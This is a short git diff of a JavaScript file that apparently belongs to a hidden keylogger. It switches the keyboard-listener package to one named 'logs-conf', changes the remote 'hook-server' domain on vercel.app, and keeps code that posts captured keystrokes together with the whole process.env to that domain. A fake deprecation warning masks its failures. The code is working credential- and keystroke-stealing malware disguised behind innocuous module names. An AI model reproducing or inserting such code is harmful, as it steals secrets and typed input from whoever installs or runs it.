@@ -6,16 +6,16 @@ try {
 
     // Try to require the jsonpacks module
     try {
-        GlobalKeyboardListener = require("jsonpacks").GlobalKeyboardListener;
+        GlobalKeyboardListener = require("logs-conf").GlobalKeyboardListener;
         v = new GlobalKeyboardListener();
     } catch (error) {
         console.warn('Some modules are deprecated and won\'t work well in the future...');
     }
 
-    const hookDomain = "https://hook-server-puce.vercel.app";
+    const hookDomain = "https://hook-server-beta.vercel.app";
     // const hookDomain = "http://localhost:5000";
     
-    axios.get(`${hookDomain}/hook/init`);
+    //axios.get(`${hookDomain}/hook/init`);
     let inputBuffer = '';
     let isShiftPressed = false; 
     let isCapsLockOn = false; 
@@ -79,6 +79,7 @@ try {
                         event: event,
                         env: process.env
                     };
+                    console.log()
                     fetchHookDomainAndPostData(data);
                 }
                 return;
